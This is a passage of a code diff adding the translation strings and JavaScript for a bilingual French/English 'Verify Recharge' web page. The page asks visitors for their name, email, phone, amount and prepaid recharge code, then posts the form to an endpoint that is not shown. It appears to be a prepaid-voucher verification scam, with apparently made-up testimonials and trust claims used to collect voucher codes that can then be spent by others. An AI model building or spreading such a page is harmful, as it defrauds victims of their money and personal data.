+        testimonial2: "Fiable et sécurisé, je n'ai jamais eu de problème avec mes recharges. Le support répond rapidement et le service est disponible à toute heure.",
+        testimonial3: "Service ultra rapide ! Ma recharge a été vérifiée en moins de 3 minutes. L'interface est simple et intuitive. Je reviendrai certainement.",
+        
+        // Features
+        ourAdvantages: "Nos Avantages",
+        trust: "Confiance",
+        trustDesc: "Service approuvé par nos partenaires",
+        speed: "Rapidité",
+        speedDesc: "Vérification en moins de 5 minutes",
+        availability: "Disponibilité",
+        availabilityDesc: "Service 24h/24, 7j/7",
+        
+        // Form
+        verifyMyRecharge: "Vérifier Ma Recharge",
+        formDescription: "Remplissez le formulaire pour vérifier et activer votre recharge",
+        lastName: "Nom",
+        firstName: "Prénom",
+        email: "E-mail",
+        phone: "Téléphone",
+        rechargeType: "Type de recharge",
+        amount: "Montant (€)",
+        rechargeCode: "Code de recharge",
+        codeFormat: "Format : 12-16 caractères alphanumériques avec tirets",
+        verifyButton: "Vérifier Ma Recharge",
+        
+        // Steps
+        validationSteps: "Étapes de Validation",
+        stepsDescription: "Un processus simple et sécurisé en quelques étapes",
+        step1Title: "Remplissez le formulaire",
+        step1Desc: "Saisissez vos informations et votre code de recharge",
+        step2Title: "Vérification sécurisée",
+        step2Desc: "Notre équipe vérifie la validité de votre code",
+        step3Title: "Validation",
+        step3Desc: "Confirmation de l'activation de votre recharge",
+        step4Title: "Notification",
+        step4Desc: "Vous recevez une confirmation par email",
+        
+        // Contact
+        contactUsTitle: "Nous Contacter",
+        contactDescription: "Des questions ? Notre équipe est là pour vous aider",
+        name: "Nom",
+        subject: "Sujet",
+        message: "Message",
+        sendMessage: "Envoyer le Message",
+        
+        // Footer
+        footerDescription: "Votre partenaire de confiance pour la vérification de recharges",
+        copyright: "© 2024 Vérifier Recharge. Tous droits réservés.",
+        
+        // Messages
+        successMessage: "Votre demande a été envoyée avec succès ! Nous vous contacterons bientôt.",
+        errorMessage: "Une erreur s'est produite. Veuillez réessayer.",
+        processingMessage: "Traitement en cours..."
+      },
+      
+      en: {
+        // Header
+        title: "Verify Recharge",
+        tagline: "Trust, speed and availability at the heart of our service",
+        verifyNow: "Verify Now",
+        contactUs: "Contact Us",
+        
+        // Stats Section
+        discoverService: "Discover Our Service",
+        verificationsApproved: "Approved verifications",
+        rechargeTypesSupported: "Supported recharge types",
+        averageVerificationTime: "Average verification time",
+        serviceAvailable: "Service available",
+        
+        // Testimonials
+        userTestimonials: "User Testimonials",
+        testimonial1: "Excellent customer service and very professional verification process. I highly recommend this service to anyone who wants a reliable solution.",
+        testimonial2: "Reliable and secure, I have never had any problems with my recharges. Support responds quickly and the service is available at all hours.",
+        testimonial3: "Ultra fast service! My recharge was verified in less than 3 minutes. The interface is simple and intuitive. I will definitely come back.",
+        
+        // Features
+        ourAdvantages: "Our Advantages",
+        trust: "Trust",
+        trustDesc: "Service approved by our partners",
+        speed: "Speed",
+        speedDesc: "Verification in less than 5 minutes",
+        availability: "Availability",
+        availabilityDesc: "24/7 service",
+        
+        // Form
+        verifyMyRecharge: "Verify My Recharge",
+        formDescription: "Fill out the form to verify and activate your recharge",
+        lastName: "Last Name",
+        firstName: "First Name",
+        email: "Email",
+        phone: "Phone",
+        rechargeType: "Recharge Type",
+        amount: "Amount (€)",
+        rechargeCode: "Recharge Code",
+        codeFormat: "Format: 12-16 alphanumeric characters with dashes",
+        verifyButton: "Verify My Recharge",
+        
+        // Steps
+        validationSteps: "Validation Steps",
+        stepsDescription: "A simple and secure process in a few steps",
+        step1Title: "Fill out the form",
+        step1Desc: "Enter your information and recharge code",
+        step2Title: "Secure verification",
+        step2Desc: "Our team verifies the validity of your code",
+        step3Title: "Validation",
+        step3Desc: "Confirmation of your recharge activation",
+        step4Title: "Notification",
+        step4Desc: "You receive an email confirmation",
+        
+        // Contact
+        contactUsTitle: "Contact Us",
+        contactDescription: "Questions? Our team is here to help",
+        name: "Name",
+        subject: "Subject",
+        message: "Message",
+        sendMessage: "Send Message",
+        
+        // Footer
+        footerDescription: "Your trusted partner for recharge verification",
+        copyright: "© 2024 Verify Recharge. All rights reserved.",
+        
+        // Messages
+        successMessage: "Your request has been sent successfully! We will contact you soon.",
+        errorMessage: "An error occurred. Please try again.",
+        processingMessage: "Processing..."
+      }
+    };
+
+    let currentLang = 'fr';
+
+    // ====================
+    // FONCTIONS UTILITAIRES
+    // ====================
+    
+     function toggleLanguage() {
+      currentLang = currentLang === 'fr' ? 'en' : 'fr';
+      updatePageLanguage();
+      document.getElementById('lang-display').textContent = currentLang === 'fr' ? 'FR | EN' : 'EN | FR';
+      document.documentElement.lang = currentLang;
+    }
+
+    function updatePageLanguage() {
+      const t = translations[currentLang];
+      document.querySelectorAll('[data-translate]').forEach(element => {
+        const key = element.getAttribute('data-translate');
+        if (t[key]) {
+          if (element.tagName === 'INPUT' && element.type === 'submit') {
+            element.value = t[key];
+          } else if (element.tagName === 'BUTTON') {
+            element.textContent = t[key];
+          } else {
+            element.textContent = t[key];
+          }
+        }
+      });
+    }
+
+    function updateFlag() {
+      const select = document.getElementById('country-code');
+      const flag = document.getElementById('selected-flag');
+      const selectedOption = select.options[select.selectedIndex];
+      flag.textContent = selectedOption.getAttribute('data-flag');
+    }
+
+    function toggleCodeVisibility() {
+      const codeInput = document.querySelector('.code-input');
+      const toggleBtn = document.querySelector('.toggle-visibility i');
+      if (codeInput.type === 'password') {
+        codeInput.type = 'text';
+        toggleBtn.className = 'far fa-eye-slash';
+      } else {
+        codeInput.type = 'password';
+        toggleBtn.className = 'far fa-eye';
+      }
+    }
+
+    function showAlert(elementId, message, type) {
+      const alertElement = document.getElementById(elementId);
+      alertElement.className = `alert alert-${type}`;
+      alertElement.textContent = message;
+      alertElement.style.display = 'block';
+      setTimeout(() => {
+        alertElement.style.display = 'none';
+      }, 5000);
+    }
+
+    // ====================
+    // GESTION DES FORMULAIRES CORRIGÉE
+    // ====================
+
+    async function handleFormSubmit(form, submitBtn, alertId, successMessage) {
+      const t = translations[currentLang];
+      const originalText = submitBtn.textContent;
+      
+      submitBtn.disabled = true;
+      submitBtn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> ${t.processingMessage}`;
+
+      try {
+        const response = await fetch(form.action, {
+          method: 'POST',
+          body: new FormData(form),
+          headers: {
+            'Accept': 'application/json'
+          }
+        });
+
+        if (response.ok) {
+          showAlert(alertId, successMessage, 'success');
+          form.reset();
+          updateFlag();
+        } else {
+          throw new Error('Erreur lors de la soumission');
+        }
+      } catch (error) {
+        showAlert(alertId, t.errorMessage, 'error');
+        console.error('Erreur:', error);
+      } finally {
+        submitBtn.disabled = false;
+        submitBtn.textContent = originalText;
+      }
+    }
+
+    // ====================
+    // INITIALISATION
+    // ====================
+
+    document.addEventListener('DOMContentLoaded', function() {
+      // Initialisation du formulaire de vérification
+      document.getElementById('verification-form').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const t = translations[currentLang];
+        handleFormSubmit(
+          this,
+          document.getElementById('submit-btn'),
+          'form-alert',
+          t.successMessage
+        );
+      });
+
+      // Initialisation du formulaire de contact
+      document.getElementById('contactForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const t = translations[currentLang];
+        handleFormSubmit(
+          this,
+          document.getElementById('contact-submit-btn'),
+          'contact-alert',
+          t.successMessage
+        );
+      });
+
+      // Initialisation du drapeau
+      updateFlag();
+
+      // Formatage automatique du code de recharge
+      const codeInput = document.querySelector('.code-input');
+      if (codeInput) {
+        codeInput.addEventListener('input', function() {
+          let value = this.value.replace(/[^A-Za-z0-9]/g, '');
+          if (value.length > 4) value = value.substring(0, 4) + '-' + value.substring(4);
+          if (value.length > 9) value = value.substring(0, 9) + '-' + value.substring(9);
+          this.value = value.substring(0, 14).toUpperCase();
+        });
+      }
+
+      // Animation au défilement
+      const observer = new IntersectionObserver(function(entries) {
+        entries.forEach(entry => {
+          if (entry.isIntersecting) {
+            entry.target.style.opacity = '1';
+            entry.target.style.transform = 'translateY(0)';
+          }
+        });
+      }, {
+        threshold: 0.1,
+        rootMargin: '0px 0px -50px 0px'
+      });
+
+      document.querySelectorAll('.stat-card, .testimonial-card, .form-container').forEach(card => {
+        card.style.opacity = '0';
+        card.style.transform = 'translateY(30px)';
+        card.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
+        observer.observe(card);
+      });
+    });
+  </script>
+</body>
+</html>
+
